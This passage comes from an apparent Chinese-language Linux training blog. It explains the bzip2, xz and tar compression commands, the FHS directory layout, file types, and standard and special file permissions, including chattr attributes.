<h3 id="bz2"><a href="#bz2" class="headerlink" title=".bz2"></a>.bz2</h3><h4 id="bzip2-的用法"><a href="#bzip2-的用法" class="headerlink" title="bzip2 的用法"></a>bzip2 的用法</h4><p>bzip2 命令用于创建和管理(包括解压缩) “ .bz2” 格式的压缩包。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">语法 bzip2( 选项 )( 参数 )</span><br><span class="line"></span><br><span class="line">选项</span><br><span class="line"></span><br><span class="line">-c 或 —— stdout :将压缩与解压缩的结果送到标准输出;</span><br><span class="line">-d 或 —— decompress :执行解压缩;</span><br><span class="line">-f 或 -force : bzip2 在压缩或解压缩时,若输出文件与现有文件同名,预设不会覆盖现有文件。若</span><br><span class="line">要覆盖。请使用此参数;</span><br><span class="line">-h 或 —— help :在线帮助;</span><br><span class="line">-k 或 —— keep : bzip2 在压缩或解压缩后,会删除原始文件。若要保留原始文件,请使用此参数;</span><br><span class="line">-s 或 —— small :降低程序执行时内存的使用量;</span><br><span class="line">-t 或 —— test :测试 .bz2 压缩文件的完整性;</span><br><span class="line">-v 或 —— verbose :压缩或解压缩文件时,显示详细的信息;</span><br><span class="line">-z 或 —— compress :强制执行压缩;</span><br><span class="line">-V 或 —— version :显示版本信息;</span><br><span class="line">--repetitive-best :若文件中有重复出现的资料时,可利用此参数提高压缩效果;</span><br><span class="line">--repetitive-fast :若文件中有重复出现的资料时,可利用此参数加快执行效果。</span><br><span class="line"></span><br><span class="line">参数 文件列表:指定要压缩的文件或指定要解压的文件。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line">bzip2 test 压缩 test 文件,生成压缩文件 test.bz2 ,并删除源文件</span><br><span class="line">bzip2 -k test 压缩 test 文件,生成压缩文件 test.bz2 ,并保留源文件</span><br><span class="line">bzip2 -d test.bz2 解压文件</span><br><span class="line">bunzip2 test.bz2 解压文件</span><br></pre></td></tr></table></figure>

<h4 id="bunzip2-的用法"><a href="#bunzip2-的用法" class="headerlink" title="bunzip2 的用法"></a>bunzip2 的用法</h4><p>bunzip2 命令解压缩由 bzip2 指令创建的 ” .bz2” 压缩包。对文件进行压缩与解压缩。此命令类似于“ gzip/gunzip” 命令,只能对文件进行压缩。对于目录只能压缩目录下的所有文件,压缩完成后,在目录下生成以 “ .bz2” 为后缀的压缩包。 bunzip2 其实是 bzip2 的符号链接,即软链接,因此压缩解压都可以通过 bzip2 实现。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mastera0 ~]# which bzip2</span><br><span class="line">/usr/bin/bzip2</span><br><span class="line">[root@mastera0 ~]# which bunzip2</span><br><span class="line">/usr/bin/bunzip2</span><br><span class="line">[root@mastera0 ~]# ll -i /usr/bin/bzip2</span><br><span class="line">33853111 -rwxr-xr-x. 1 root root 36752 Jul 31 2014 /usr/bin/bzip2</span><br><span class="line">[root@mastera0 ~]# ll -i /usr/bin/bunzip2</span><br><span class="line">34293684 lrwxrwxrwx. 1 root root 5 Jun 23 13:50 /usr/bin/bunzip2 -&gt; bzip2</span><br><span class="line"></span><br><span class="line">bunzip2 [ -fkvsVL ] [ filenames ... ]</span><br><span class="line"></span><br><span class="line">-f 或 --force :解压缩时,若输出的文件与现有文件同名时,预设不会覆盖现有的文件;</span><br><span class="line">-k 或 --keep :在解压缩后,预设会删除原来的压缩文件。若要保留压缩文件,请使用此参数;</span><br><span class="line">-s 或 --small :降低程序执行时,内存的使用量;</span><br><span class="line">-v 或 --verbose :解压缩文件时,显示详细的信息;</span><br><span class="line">-l , --license , -V 或 —— version :显示版本信息。</span><br></pre></td></tr></table></figure>


<h3 id="xz"><a href="#xz" class="headerlink" title=".xz"></a>.xz</h3><p>XZ Utils 是为 POSIX 平台开发具有高压缩率的工具。它使用 LZMA2 压缩算法,生成的压缩文件比POSIX 平台传统使用的 gzip、bzip2 生成的压缩文件更小,而且解压缩速度也很快。最初 XZ Utils的是基于 LZMA-SDK 开发,但是 LZMA-SDK 包含了一些 WINDOWS 平台的特性,所以 XZ Utils 为以适应 POSIX 平台作了大幅的修改。XZ Utils 的出现也是为了取代 POSIX 系统中旧的 LZMA Utils。XZ Utils 主要包含了下列部分:</p>
<ul>
<li>命令行程序 xz ,用来生成和解压缩 .xz 压缩文件。</li>
<li>一组实用的脚本工具 (xzcat, xdiff, xzgrep 等)提供浏览,查找以及比较 .xz 文件内<br>容等功能。</li>
<li>liblzma 压缩库,提供算法的实现和近似于 ZLIB 的编程接口。</li>
<li>提供对 LZMA Utils 的一些兼容</li>
</ul>
<p>xz 文件格式</p>
<p>XZ Utils 工具生成的压缩文件扩展名为 .xz (MIME 类型为”application/x-xz”)。</p>
<p>.xz 文件格式具有下列特点:</p>
<ul>
<li>基于数据流: 易于通过管道 (pipe) 生成压缩文件或解压缩文件。.xz 文件格式与 .gz/.bz2 文件一样,不具备对多个文件进行归档打包的能力。若要处理多个文件,可以和归档工具 tar 结合使用,生成扩展名为 .tar.xz 或 .txz 的压缩文件。</li>
<li>随机读取: 存储的数据被划分为独立的压缩块,并对每个压缩块进行索引,当每个压缩块比较小时,便能够进行有限的随机读取压缩数据。</li>
<li>完整性验证: 可以使用 CRC32、CRC64、SHA-256 来进行数据的完整性验证,也可以增加自定义验证方法。</li>
<li>可连接(concatenation): 类似于 .gz/.bz2 文件,可以把多个压缩数据流连接到一个文件中。解压缩时,就像解压一个正常单压缩流文件一样。</li>
<li>支持多 filter 和 filter 链: 提供自定义 filter 的能力,也能够将多个 filter 组成filter 链,对数据进行处理。这点与 Unix 命令间使用的管道 (pipe) 类似。</li>
<li>可填充(padding): 可以在 .xz 文件末尾填充二进制’0’以充满特定大小的空间,比如备份磁带上的一个块 (block)。</li>
</ul>
<p>XZ Utils 具有高压缩率,解压速度快的特点。能够生成更小文件的同时,也能提供稳定快速的解压,在对数据大小比较敏感的场合,比如说大数据的网络传输,文件的备份,处理能力有限的嵌入系统等场合,有着十分广泛的用途。</p>
<h4 id="xz-命令用法"><a href="#xz-命令用法" class="headerlink" title="xz 命令用法"></a>xz 命令用法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">语法 xz ( 选项 )( 参数 )</span><br><span class="line"></span><br><span class="line">选项</span><br><span class="line"></span><br><span class="line">-z, --compress</span><br><span class="line">force compression 强制压缩</span><br><span class="line">-d, --decompress, --uncompress</span><br><span class="line">force decompression 解开压缩文件</span><br><span class="line">-t, --test test compressed file integrity 测试压缩文件是否正确无误</span><br><span class="line">-l, --list list information about .xz files 列出压缩文件的相关信息</span><br><span class="line">-k, --keep keep (don't delete) input files 不删除源文件</span><br><span class="line">-f, --force force overwrite of output file and (de)compress links 强制压缩,覆盖输出文件同名的文件</span><br><span class="line">-c, --stdout, --to-stdout write to standard output and don't delete input files 写入标准输出,不要删除输入文件</span><br><span class="line">-0 ... -9 compression preset; default is 6; take compressor *and* decompressor memory usage into account before using 7-9! 压缩效率是一个介于</span><br><span class="line">1~9 的数值,预设值为 “ 6” ,指定愈大的数值,压缩效率就会愈高;解压由县考虑使用 7-9</span><br><span class="line">-e, --extreme try to improve compression ratio by using more CPU time; does not affect decompressor memory requirements 通过使用更多的处理器时间</span><br><span class="line">来提高压缩比;不影响解压时的内存需求</span><br><span class="line">-T, --threads=NUM use at most NUM threads; the default is 1; set to 0 to use the number of processor cores 最多使用的线程数量,默认为 1 ,如果设置为</span><br><span class="line">0 去使用处理器内核的数量</span><br><span class="line">-q, --quiet suppress warnings; specify twice to suppress errors too 抑制警告;指定两次</span><br><span class="line">以抑制错误</span><br><span class="line">-v, --verbose be verbose; specify twice for even more verbose</span><br><span class="line">-h, --help display this short help and exit</span><br><span class="line">-H, --long-help display the long help (lists also the advanced options)</span><br><span class="line">-V, --version display the version number and exit</span><br><span class="line"></span><br><span class="line">参数 文件列表:指定要压缩的文件列表。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line">xz test 压缩一个文件 test ,压缩成功后删除源文件</span><br><span class="line">xz -d -k test.xz 解压 test.xz 文件, -k 参数保证源文件不被删除</span><br><span class="line">xz -l test.xz 查看基本信息,包括压缩率等</span><br><span class="line">xz -k7 test 使用参数 -0, -1, -2, ... -6, ... -9 或参数 --fast, --best 设定压缩率。 xz 命令的默认为-6 。</span><br><span class="line">借助 xargs 命令并行压缩多文件。下面的命令行可以将 /var/log 目录下所有的扩展名为 .log 的文件压缩。通过 xargs 命令同时运行多个 xz 进行压缩。</span><br><span class="line">find /var/log -type f -iname "*.log" -print0 | xargs -P4 -n16 xz -T1</span><br><span class="line">注意:运行此命令须有 root 权限。</span><br></pre></td></tr></table></figure>


<h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><p>tar 命令可以为 linux 的文件和目录创建档案。利用 tar ,可以为某一特定文件创建档案(备份文件),也可以在档案中改变文件,或者向档案中加入新的文件。 tar 最初被用来在磁带上创建档案,现在,用户可以在任何设备上创建档案。利用 tar 命令,可以把一大堆的文件和目录全部打包成一个文件,这对于备份文件或将几个文件组合成为一个文件以便于网络传输是非常有用的。</p>
<p>首先要弄清两个概念:打包和压缩。</p>
<ul>
<li>打包是指将一大堆文件或目录变成一个总的文件;</li>
<li>压缩则是将一个大的文件通过一些压缩算法变成一个小文件。</li>
</ul>
<p>为什么要区分这两个概念呢?</p>
<p>这源于 Linux 中很多压缩程序只能针对一个文件进行压缩,这样当你想要压缩一大堆文件时,你得先将这一大堆文件先打成一个包( tar 命令),然后再用压缩程序进行压缩( gzip bzip2 命令)。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">语法 tar ( 选项 )( 参数 )</span><br><span class="line"></span><br><span class="line">选项</span><br><span class="line">-A 或 --catenate :新增文件到以存在的备份文件;</span><br><span class="line">-B :设置区块大小;</span><br><span class="line">-c 或 --create :建立新的备份文件;</span><br><span class="line">-C &lt; 目录 &gt; :这个选项用在解压缩,若要在特定目录解压缩,可以使用这个选项。</span><br><span class="line">-d :记录文件的差别;</span><br><span class="line">-x 或 --extract 或 --get :从备份文件中还原文件;</span><br><span class="line">-t 或 --list :列出备份文件的内容;</span><br><span class="line">-z 或 --gzip 或 --ungzip :通过 gzip 指令处理备份文件;</span><br><span class="line">-Z 或 --compress 或 --uncompress :通过 compress 指令处理备份文件;</span><br><span class="line">-f&lt; 备份文件 &gt; 或 --file=&lt; 备份文件 &gt; :指定备份文件;</span><br><span class="line">-v 或 --verbose :显示指令执行过程;</span><br><span class="line">-r :添加文件到已经压缩的文件;</span><br><span class="line">-u :添加改变了和现有的文件到已经存在的压缩文件;</span><br><span class="line">-j :支持 bzip2 解压文件;</span><br><span class="line">-J :支持 xz 解压文件;</span><br><span class="line">-v :显示操作过程;</span><br><span class="line">-l :文件系统边界设置;</span><br><span class="line">-k :保留原有文件不覆盖;</span><br><span class="line">-m :保留文件不被覆盖;</span><br><span class="line">-w :确认压缩文件的正确性;</span><br><span class="line">-p 或 --same-permissions :用原来的文件权限还原文件;</span><br><span class="line">-P 或 --absolute-names :文件名使用绝对名称,不移除文件名称前的 “ /” 号;</span><br><span class="line">-N &lt; 日期格式 &gt; 或 --newer=&lt; 日期时间 &gt; :只将较指定日期更新的文件保存到备份文件里;</span><br><span class="line">--exclude=&lt; 范本样式 &gt; :排除符合范本样式的文件。</span><br><span class="line"></span><br><span class="line">参数 文件列表:指定要打包的文件或目录列表。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line">tar -cvf log.tar log2012.log 仅打包,不压缩! tar -xf 解压</span><br><span class="line">tar -zcvf log.tar.gz log2012.log 打包后,以 gzip 压缩 tar -zxf 解压</span><br><span class="line">tar -jcvf log.tar.bz2 log2012.log 打包后,以 bzip2 压缩 tar -jxf 解压</span><br><span class="line">tar -Jcvf log.tar.xz log2012.log 打包后,以 xz 压缩 tar -Jxf 解压</span><br><span class="line">tar -tf log.tar 查看打包文件</span><br><span class="line">注意 -f 参数后面必须接文件名</span><br></pre></td></tr></table></figure>

<h2 id="04-Linux压缩打包课后习题"><a href="#04-Linux压缩打包课后习题" class="headerlink" title="04-Linux压缩打包课后习题"></a>04-Linux压缩打包课后习题</h2><ol>
<li>通过dd创建4个5M的文件,分别为afile;bfile;cfile;dfile,并将这4个文件放在/tmp/test目录中保存</li>
<li>对这4个相同大小的文件进行压缩,分别使用zip;bzip2;gzip;xz,并观察</li>
<li>在将压缩文件进行解压,并观察</li>
<li>将/tmp/test目录进行打包,分别使用gzip和bzip2压缩</li>
</ol>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux系统基础培训</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 文件和目录</title>
    <url>/2016/12/22/booboo_linux_base/03-Linux%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/</url>
    <content><![CDATA[<h2 id="Linux-目录"><a href="#Linux-目录" class="headerlink" title="Linux 目录"></a>Linux 目录</h2><h3 id="Linux-目录配置的依据-–FHS"><a href="#Linux-目录配置的依据-–FHS" class="headerlink" title="Linux 目录配置的依据 –FHS"></a>Linux 目录配置的依据 –FHS</h3><p>因为利用 Linux 来开发产品或 distributions 的社区 / 公司或个人实在太多了 , 如果每个人都用自己的想法来配置文件放置的目录 , 那将可能造成很多管理上的困扰。 你能想象 , 你进入一个企业之后 , 所 接触到的 Linux 目录配置方法竟然跟你以前学的完全不同吗 ? 很难想象吧 ~ 所以 , 后来就有所谓的Filesystem Hierarchy Standard (FHS) 标准的出炉了 !</p>
<p>根据 FHS(<a href="http://www.pathname.com/fhs/" target="_blank" rel="noopener">http://www.pathname.com/fhs/</a>) 的官方文件指出 , 他们的主要目的是希望让使用者可以了解到已安装软件通常放置在哪个目录下 , 所以他们希望独立的软件开发商、操作系统制作者、以及想要维护系统的用户 , 都能够遵循 FHS 的标准。 也就是说 ,FHS 的重点在于规范每个特定的目录下应该存放什么样子的数据而已。</p>
<p>亊实上 ,FHS 是根据过去的经验一直再持续的改版的 ,FHS 依据文件系统使用的频繁与否允许使用者随意更动 , 而将目录定义成为四种交互作用的形态 , 用表格来说有点像底下这样 ：</p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left">可分享的 (shareable)</th>
<th align="left">不可分享的 (unshareable)</th>
</tr>
</thead>
<tbody><tr>
<td align="left">不变的 (static)</td>
<td align="left">/usr ( 软件放置处 )</td>
<td align="left">/etc ( 配置文件 )</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">/opt ( 第三方协力软件 )</td>
<td align="left">/boot ( 开机不核心档 )</td>
</tr>
<tr>
<td align="left">可变动的 (variable)</td>
<td align="left">/var/mail ( 使用者邮件信箱 )</td>
<td align="left">/var/run ( 程序相关 )</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">/var/spool/news ( 新闻组 )</td>
<td align="left">/var/lock ( 程序相关 )</td>
</tr>
</tbody></table>
<p><img src="pic/02.png" alt="02"></p>
<h3 id="目录树"><a href="#目录树" class="headerlink" title="目录树"></a>目录树</h3><p>在类 Unix 系统中并不存在 C/D/E/F 盘符,一切的文件都是从 “ 根 (/)” 目录开始的并按照文件系统目录标准 FHS 采用树形结构来存放文件并定义了每个区域的用途。</p>
<p>目录名称严格的区分大小写,例如 root 、 rOOt 、 Root 、 rooT 等等均代表是不同的独立目录,并且名称中不得包含反斜杠 (/) 。</p>
<p><img src="pic/04.png" alt="04"></p>
<p>主要常见的目录定义:</p>
<table>
<thead>
<tr>
<th align="left">目录名称</th>
<th align="left">应放置文件的内容</th>
</tr>
</thead>
<tbody><tr>
<td align="left">/boot</td>
<td align="left">开机所需文件 —— 内核,开机菜单及所需配置文件等</td>
</tr>
<tr>
<td align="left">/dev</td>
<td align="left">任何设备与接口都以文件形式存放在此目录</td>
</tr>
<tr>
<td align="left">/etc</td>
<td align="left">配置文件</td>
</tr>
<tr>
<td align="left">/home</td>
<td align="left">用户主目录</td>
</tr>
<tr>
<td align="left">/bin</td>
<td align="left">单用户维护模式下还能够被操作的命令</td>
</tr>
<tr>
<td align="left">/lib</td>
<td align="left">开机时用到的函数库及/bin 与/sbin 下面命令要调用的函数</td>
</tr>
<tr>
<td align="left">/sbin</td>
<td align="left">开机过程中需要的</td>
</tr>
<tr>
<td align="left">/media</td>
<td align="left">一般挂载或删除的设备</td>
</tr>
<tr>
<td align="left">/opt</td>
<td align="left">放置第三方的软件</td>
</tr>
<tr>
<td align="left">/root</td>
<td align="left">系统管理员的主文件夹</td>
</tr>
<tr>
<td align="left">/srv</td>
<td align="left">一些网络服务的数据目录</td>
</tr>
<tr>
<td align="left">/tmp</td>
<td align="left">任何人均可使用的 “ 共享 ” 临时目录</td>
</tr>
<tr>
<td align="left">/proc</td>
<td align="left">虚拟文件系统,例如系统内核,进程,外部设备及网络状态等</td>
</tr>
<tr>
<td align="left">/usr/local</td>
<td align="left">用户自行安装的软件</td>
</tr>
<tr>
<td align="left">/usr/sbin</td>
<td align="left">非系统开机时需要的软件/命令/脚本</td>
</tr>
<tr>
<td align="left">/usr/share</td>
<td align="left">帮助与说明文件,也可放置共享文件。</td>
</tr>
<tr>
<td align="left">/var</td>
<td align="left">主要存放经常变化的文件,如日志。</td>
</tr>
<tr>
<td align="left">/lost+found</td>
<td align="left">当文件系统发生错误时,将一些丢失的文件片段存放在这里1.3 路径</td>
</tr>
</tbody></table>
<p>另外一个重要的概念 “ 路径 ” ,这个路径指的是如何找到某个文件,分为 “ 绝对路径 ” 与 “ 相对路径 ” :</p>
<ul>
<li>绝对路径 (absolute): 由根目录 (/) 开始写起的目录或文件名</li>
<li>相对路径 (relative): 相对于当前路径的写法</li>
</ul>
<p>举例来说一个客人想找下厕所,你有两种回答的方法。</p>
<ul>
<li>绝对路径:首先坐车来到你家,到了你家后，右手边第一个房间就是厕所。</li>
<li>相对路径:前面右拐第一个房间。</li>
</ul>
<p>如果你说的是绝对路径,那么任何客人都可以按照这个提示找到你家的厕所,但缺点是过于繁琐,如果说的是相对路径,那么这个人并不是在每个路口右转都能找到厕所,缺点是不具备普遍性。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# cd /etc/sysconfig/network-scripts/</span><br><span class="line">[root@rhel7 network-scripts]# pwd</span><br><span class="line">/etc/sysconfig/network-scripts</span><br><span class="line">[root@rhel7 network-scripts]# cd ../modules</span><br><span class="line">[root@rhel7 modules]# pwd</span><br><span class="line">/etc/sysconfig/modules</span><br></pre></td></tr></table></figure>

<h2 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h2><p>类 Unix 系统的设计初衷就是为让多用户同时工作,所以也迫使 Linux 系统有了极强的安全性。接下来我们一起来看看 linux 系统示如何实现安全性的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 tmp]# ll /</span><br><span class="line">total 4148</span><br><span class="line">lrwxrwxrwx.   1 root root        7 May  5 17:28 bin -&gt; usr/bin</span><br><span class="line">dr-xr-xr-x.   4 root root     4096 May  5 17:40 boot</span><br><span class="line">drwxr-xr-x.  15 root root     4096 Aug 19 13:19 content</span><br><span class="line">-rw-------    1 root root  2166784 Aug  8 05:24 core.2052</span><br><span class="line">-rw-------    1 root root 19017728 Aug  8 05:27 core.2488</span><br><span class="line">drwxr-xr-x   19 root root     3380 Oct 26 12:22 dev</span><br><span class="line">drwxr-xr-x. 138 root root    12288 Oct 26 12:22 etc</span><br><span class="line">drwxr-xr-x.   4 root root       31 Aug 23 17:32 home</span><br><span class="line">lrwxrwxrwx.   1 root root        7 May  5 17:28 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx.   1 root root        9 May  5 17:28 lib64 -&gt; usr/lib64</span><br><span class="line">drwxr-xr-x.   2 root root        6 May 25  2015 media</span><br><span class="line">drwxr-xr-x.   2 root root        6 May 25  2015 mnt</span><br><span class="line">drwxr-xr-x.   4 root root       36 May  6 13:19 opt</span><br><span class="line">dr-xr-xr-x  229 root root        0 Oct 26  2016 proc</span><br><span class="line">dr-xr-x---.  26 root root     4096 Oct 12 14:11 root</span><br><span class="line">drwxr-xr-x   39 root root     1200 Oct 26 12:24 run</span><br><span class="line">lrwxrwxrwx.   1 root root        8 May  5 17:28 sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x.   2 root root        6 May 25  2015 srv</span><br><span class="line">dr-xr-xr-x   13 root root        0 Oct 26  2016 sys</span><br><span class="line">drwxrwxrwt.  31 root root     4096 Oct 26 12:42 tmp</span><br><span class="line">drwxr-xr-x.  13 root root     4096 May  5 17:28 usr</span><br><span class="line">drwxr-xr-x.  23 root root     4096 Oct 26  2016 var</span><br></pre></td></tr></table></figure>

<p>第二字段,文件硬链接数或目录子目录数</p>
<h3 id="文件的分类"><a href="#文件的分类" class="headerlink" title="文件的分类"></a>文件的分类</h3><table>
<thead>
<tr>
<th align="left">文件</th>
<th align="left"></th>
<th align="left">操作</th>
</tr>
</thead>
<tbody><tr>
<td align="left">普通文件</td>
<td align="left">纯文本档 (ASCII)</td>
<td align="left">touch file</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">二进制文件 (binary)</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"></td>
<td align="left">数据格式文件 (data)</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">目录</td>
<td align="left">(directory)</td>
<td align="left">mkdir dire</td>
</tr>
<tr>
<td align="left">连结档</td>
<td align="left">(link)</td>
<td align="left">ln file hfile</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left">ln -s file sfile</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left">ln -s ‘pwd’/file ssfile 绝对路径的软链接文件</td>
</tr>
<tr>
<td align="left">设备与装置文件</td>
<td align="left">(device)</td>
<td align="left">mknod bfile b 252 0 块设备</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left">mknod cfile c 4 2 字符设备</td>
</tr>
<tr>
<td align="left">数据输送文件</td>
<td align="left">(FIFO, pipe)</td>
<td align="left">mkfifo pfile 管道文件</td>
</tr>
<tr>
<td align="left">资料接口文件</td>
<td align="left">(sockets)</td>
<td align="left">mksock sfile sock 文件</td>
</tr>
</tbody></table>
<p>-: 普通文件, d: 目录文件, l: 链接文件, b: 块设备文件, c: 字符设备文件, p: 管道文件</p>
<h3 id="一般权限-UGO"><a href="#一般权限-UGO" class="headerlink" title="一般权限 UGO"></a>一般权限 UGO</h3><p>Linux 系统中一切都是文件,文件和目录的所属与权限 —— 来分别规定所有者、所有组、其余人的读,写,执行权限。</p>
<p>读 (read) ,写 (write) ,执行 (execute )简写即为 (r,w,x) ,亦可用数字 (4,2,1) 表示</p>
<table>
<thead>
<tr>
<th align="left">权限</th>
<th align="left">读</th>
<th align="left">写</th>
<th align="left">执行</th>
<th align="left">读</th>
<th align="left">写</th>
<th align="left">执行</th>
<th align="left">读</th>
<th align="left">写</th>
<th align="left">执行</th>
</tr>
</thead>
<tbody><tr>
<td align="left">字符表示</td>
<td align="left">r</td>
<td align="left">w</td>
<td align="left">x</td>
<td align="left">r</td>
<td align="left">w</td>
<td align="left">x</td>
<td align="left">r</td>
<td align="left">w</td>
<td align="left">x</td>
</tr>
<tr>
<td align="left">数字表示</td>
<td align="left">4</td>
<td align="left">2</td>
<td align="left">1</td>
<td align="left">4</td>
<td align="left">2</td>
<td align="left">1</td>
<td align="left">4</td>
<td align="left">2</td>
<td align="left">1</td>
</tr>
<tr>
<td align="left">权限分配</td>
<td align="left">文件所有者</td>
<td align="left"></td>
<td align="left"></td>
<td align="left">文件所属组</td>
<td align="left"></td>
<td align="left"></td>
<td align="left">其他用户</td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<p>举例 : 如果某文件权限为 7 则代表可读,可写,可执行 (4+2+1) 。若权限为 6(4+2) 则代表可读,可写。那么权限为 5 与 3 时分别代表了什么?</p>
<p>答案:权限为 5 代表可读 (4) 和可执行 (1) 。而权限为 3 代表可写 (2) 和可执行 (1) 。</p>
<hr>
<p>文件的权限为 rw-r–r– 也就是分别表示所有者 ( 属主 ) 有读写权限,所有组 ( 属组 ) 有读权限,其余人也仅有读权限。</p>
<p>这个时候发现问题了吗?对于目录文件的读和写权限我们还可以理解,目录要能执行操作?</p>
<p>普通文件即实际保存数据的地方,其并不具备删除自身的权限:</p>
<ul>
<li>r: 可读取文件的实际内容</li>
<li>w: 可编辑 / 新增 / 修改该文件的实际内容</li>
<li>x: 可被执行</li>
</ul>
<p>目录文件即保存有目录结构和文件权限:</p>
<ul>
<li>r: 可读取目录结构和权限</li>
<li>w: 可更改目录结构列表、新建 / 删除 / 重命名 / 转移子文件 / 目录。</li>
<li>x: 表示用户可进入到该目录中</li>
</ul>
<h3 id="特殊权限-suid-sgid-sticky"><a href="#特殊权限-suid-sgid-sticky" class="headerlink" title="特殊权限 suid\sgid\sticky"></a>特殊权限 suid\sgid\sticky</h3><p>单纯对文件位置的 rwx 权限肯定不能满足我们对安全、便捷工作的需求,所以便有了 SUID 与 SGID 的特殊权限机制。</p>
<p>SUID</p>
<ul>
<li>范围 : 二进制的可执行的文件</li>
<li>作用 : 临时拥有所有者的权限</li>
</ul>
<p>SGID</p>
<ul>
<li>范围 : 目录或者拥有可执行权限的文件</li>
<li>作用 : 继承目录所属组</li>
</ul>
<p>SBIT ( STICKY )</p>
<ul>
<li>范围 : 目录</li>
<li>作用 : 只有 root 用户和文件拥有者有权删除目录中的文件。</li>
</ul>
<p>SUID</p>
<p>比如:<br><code>-rwsr-xr-x. 1 root root 27832 Jan 30 2014 /usr/bin/passwd</code></p>
<p>所有用户都可以执行用于修改用户密码的 passwd 命令,但用户密码保存在 /etc/shadow 文件中,默认权限是 000 即除了超级用户 root 外的所有用户都没有查看或编辑该文件的权限,所以对 passwd 命令加上SUID 权限位,则可让普通用户临时获得程序所有者的身份,即以 root 用户的身份将变更的密码信息写入到 shadow 文件中。</p>
<p><code>---s--x--x. 1 root root 130712 Sep 1 2015 sudo</code></p>
<p>SGID:</p>
<p>功能一:让执行者临时拥有属组的权限(对拥有执行权限的二进制程序设置)</p>
<p>举例:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-r-xr-sr-x. 1 root tty</span><br><span class="line">-rwxr-sr-x. 1 root tty</span><br><span class="line">15344 Jan 27 2014 wall</span><br><span class="line">19536 Aug 21 2015 write</span><br></pre></td></tr></table></figure>

<p>功能二:在该目录中创建的文件自动继承此目录的用户组(只可以对目录设置)</p>
<p>比如:我们将某个部门的工作目录给予了 SGID 权限,这样所有人创建的文件都归相同的工作组,这样方便以后的管理。</p>
<p>SBIT(Sticky Bit):</p>
<p>比如:<br><code>drwxrwxrwt. 7 root root 4096 Jun 22 13:20 /tmp</code></p>
<p>一般老师希望学生可以将作业上传到某个特定目录 —— 但为了避免某些小破坏份子,想限制删除其他人文件的话,那就要设置 SBIT 位了,当然也可以叫做特殊权限位之粘滞位。</p>
<h3 id="隐藏属性-ATTR"><a href="#隐藏属性-ATTR" class="headerlink" title="隐藏属性 ATTR"></a>隐藏属性 ATTR</h3><p>文件权限除了 UGO 读写执行与 SUID 、 SGID 、 SBIT 外还有一种隐藏权限,例如明明有权限删除某个文件却报错了,或者仅能为某个文件追加内容而不能减少内容,遇到这种很 “ 奇怪 ” 的文件,就要怀疑是文件被设置隐藏权限了。</p>
<p>chattr 命令用于设置文件的隐藏权限,格式为: “ chattr [ 参数 ] 文件 ” 。</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">i</td>
<td align="left">将无法对文件进行修改,若对目录设置后则仅能修改子文件而不能新建或删除。</td>
</tr>
<tr>
<td align="left">a</td>
<td align="left">仅允许补充(追加)内容.无法覆盖/删除(Append Only)。</td>
</tr>
<tr>
<td align="left">S</td>
<td align="left">文件内容变更后立即同步到硬盘(sync)。</td>
</tr>
<tr>
<td align="left">s</td>
<td align="left">彻底从硬盘中删除,不可恢复(用 0 填充原文件所在硬盘区域)。</td>
</tr>
<tr>
<td align="left">A</td>
<td align="left">不再修改这个文件的最后访问时间(atime)。</td>
</tr>
<tr>
<td align="left">b</td>
<td align="left">不再修改文件或目录的存取时间。</td>
</tr>
<tr>
<td align="left">D</td>
<td align="left">检查压缩文件中的错误。</td>
</tr>
<tr>
<td align="left">d</td>
<td align="left">当使用 dump 命令备份时忽略本文件/目录。</td>
</tr>
<tr>
<td align="left">c</td>
<td align="left">默认将文件或目录进行压缩。</td>
</tr>
<tr>
<td align="left">u</td>
<td align="left">当删除此文件后依然保留其在硬盘中的数据,方便日后恢复。</td>
</tr>
<tr>
<td align="left">t</td>
<td align="left">让文件系统支持尾部合并(tail-merging)。</td>
</tr>
<tr>
<td align="left">X</td>
<td align="left">可以直接访问压缩文件的内容。</td>
</tr>
</tbody></table>
<p>lsattr 命令用于显示文件的隐藏权限,格式为: “ lsattr [ 参数 ] 文件 ” 。</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">a</td>
<td align="left">显示所有文件和目录。</td>
</tr>
<tr>
<td align="left">l</td>
<td align="left">显示隐藏属性的全称(默认简写成一个字母)。</td>
</tr>
<tr>
<td align="left">R</td>
<td align="left">递归处理,将指定目录下的所有文件及子目录一并处理。</td>
</tr>
<tr>
<td align="left">d</td>
<td align="left">若目标文件为目录,请加此参数。</td>
</tr>
</tbody></table>
<p>具体用法见第三章节</p>
